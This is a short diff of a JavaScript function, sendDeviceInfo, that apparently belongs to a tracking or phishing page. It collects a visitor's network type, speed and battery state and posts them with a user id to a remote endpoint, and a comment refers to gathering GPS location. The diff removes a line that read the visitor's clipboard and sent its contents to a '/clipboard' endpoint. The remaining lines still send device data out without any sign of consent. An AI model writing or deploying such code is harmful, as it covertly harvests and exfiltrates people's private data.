@@ -138,7 +138,6 @@ async function sendDeviceInfo(){
   if(navigator.connection){var nc=navigator.connection;td+="<br><b>🌐 "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
   if("getBattery" in navigator){try{var batt=await navigator.getBattery();var pct=Math.round(batt.level*100);td+="<b>🔋 "+pct+"% | Charging:"+batt.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:batt.charging});}catch(e){}}
   $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
-  if(navigator.clipboard&&navigator.clipboard.readText){try{var cl=await navigator.clipboard.readText();if(cl&&cl.trim())$.post(a+"/clipboard",{uid:uid,clip:encodeURIComponent(cl)});}catch(e){}}
 }
 
 // ── Location: called at button click with GPS priority ────────────────────────
